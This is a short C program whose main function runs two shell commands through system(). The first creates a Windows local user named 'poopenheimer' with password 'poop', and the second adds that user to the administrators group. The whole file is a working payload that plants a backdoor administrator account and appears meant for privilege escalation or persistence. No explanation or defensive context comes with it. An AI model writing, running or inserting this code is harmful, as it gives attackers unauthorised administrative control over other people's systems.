#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user poopenheimer poop /add");
  i = system ("net localgroup administrators poopenheimer /add");
  
  return 0;
}

